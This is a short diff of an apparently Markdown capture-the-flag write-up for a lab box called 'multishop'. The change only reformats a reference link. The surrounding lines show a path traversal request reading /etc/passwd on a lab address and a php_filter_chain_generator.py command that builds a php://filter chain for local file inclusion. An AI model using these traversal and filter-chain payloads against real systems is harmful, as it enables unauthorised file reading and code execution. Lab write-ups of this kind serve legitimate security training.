@@ -67,7 +67,9 @@ http://10.1.2.140/bio/?name=../../../etc/passwd
 ![alt text](/assets/images/hacktrace/multishop/image6.png)
 It turns out that we can do file inclusion, seen from the response given. 
 Referensi file inclusion :
-`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md`
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+```
 after reading through it turns out that file inclusion using wrappers (php: //filter) can be entered, we create the payload using the php_filter_chain_generator.py tool 
 ```
 python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
